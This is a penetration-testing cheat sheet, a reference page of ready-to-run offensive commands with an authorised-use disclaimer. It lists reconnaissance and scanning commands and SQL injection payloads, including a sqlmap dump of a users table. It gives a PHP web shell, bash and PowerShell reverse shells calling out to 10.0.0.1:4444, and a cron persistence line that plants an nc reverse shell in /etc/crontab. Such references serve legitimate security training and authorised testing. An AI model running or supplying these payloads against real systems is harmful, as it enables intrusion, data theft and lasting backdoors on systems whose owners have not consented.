***

### **🛡️ Penetration Testing Cheat Sheet**

**Disclaimer:** *Use only on targets you own or have explicit written permission to test. Unauthorized access is illegal.*

---

### **1. Reconnaissance & Enumeration**

| Task | Command / Tool | Purpose |
| :--- | :--- | :--- |
| **DNS Lookup** | `dig target.com ANY` `nslookup target.com` | Find DNS records (A, MX, TXT, etc.) |
| **Subdomain Discovery** | `sublist3r -d target.com` `amass enum -d target.com` `gobuster dns -d target.com -w wordlist.txt` | Find subdomains (dev., api., test.) |
| **Identify Tech** | `whatweb target.com` `wappalyzer` (Browser Ext) | Fingerprint web tech (CMS, frameworks) |
| **Port Scanning** | `nmap -sS -sV -sC -O -A -T4 target.com` `nmap -p- --min-rate 1000 target.com` | Discover open ports & services |
| **Web Content Discovery** | `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak` `ffuf -w wordlist.txt -u http://target.com/FUZZ` | Find hidden directories & files |

---

### **2. Vulnerability Assessment**

| Task | Command / Tool | Purpose |
| :--- | :--- | :--- |
| **General Web Vuln Scan** | `nikto -h http://target.com` | Quick scan for common misconfigurations |
| **Targeted Vuln Scanning** | `nuclei -u http://target.com -t /path/to/templates/` | Fast, template-based scanning |
| **WordPress Scanning** | `wpscan --url http://target.com --enumerate u,p,t --api-token YOUR_TOKEN` | Enumerate users, plugins, themes & vulns |

---

### **3. Exploitation**

#### **SQL Injection (SQLi)**
| Step | Command / Payload |
| :--- | :--- |
| **Detection** | `product.php?id=1'` `product.php?id=1' OR 1=1-- -` |
| **Union Attack (# of columns)** | `product.php?id=1' ORDER BY 1-- -` <br> `... ORDER BY 2-- -` <br> `... ORDER BY 3-- -` <br> (Continue until error) |
| **Union Attack (Extract Data)** | `product.php?id=-1' UNION SELECT 1,version(),user(),4-- -` |
| **Automation** | `sqlmap -u "http://site.com/page?id=1" --batch` <br> `sqlmap -u "http://site.com/page?id=1" --dbs` <br> `sqlmap -u "http://site.com/page?id=1" -D db_name -T users --dump` |

#### **File Upload & Web Shells**
*   **Basic PHP Shell:** `<?php system($_GET['cmd']); ?>`
*   **PHP Reverse Shell:** Upload a script containing a reverse shell payload.
*   **Listener:** `nc -nvlp 4444`

#### **Command Injection**
*   **Basic Test:** `; whoami`
*   **Linux Reverse Shell:** `; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'`
*   **Windows Reverse Shell (PowerShell):** `; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

---

### **4. Post-Exploitation**

| Task | Command / Tool | Purpose |
| :--- | :--- | :--- |
| **Upgrade Shell** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` `CTRL+Z` then `stty raw -echo; fg` and `reset` | Stabilize a reverse shell |
| **Linux PrivEsc** | `find / -perm -u=s -type f 2>/dev/null` (SUID) <br> `linpeas.sh` (Auto script) | Find privilege escalation vectors |
| **Windows PrivEsc** | `winpeas.exe` <br> `whoami /priv` | Find privilege escalation vectors |
| **Persistence (Linux)** | `echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.0.0.1 4444 >/tmp/f' >> /etc/crontab` | Add a reverse shell to cron |

---

### **5. Useful Wordlists**

*   **Directories/Files:** `/usr/share/wordlists/dirb/common.txt` (Kali)
*   **Subdomains:** `/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`
*   **Passwords:** `/usr/share/wordlists/rockyou.txt`

---

### **6. Quick Command Reference**

```bash
# Netcat - Listener
nc -nvlp 4444

# cURL - Grab Headers
curl -I http://target.com

# Nmap - Quick Top Ports
nmap -sC -sV -T4 target.com

# Gobuster - Directory Brute-force
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

# Searchsploit - Find Exploits
searchsploit "Apache 2.4.49"
```

***

**Remember:** This sheet is a quick reference. Always understand the commands you are running and the context of the target system. Happy (ethical) hacking!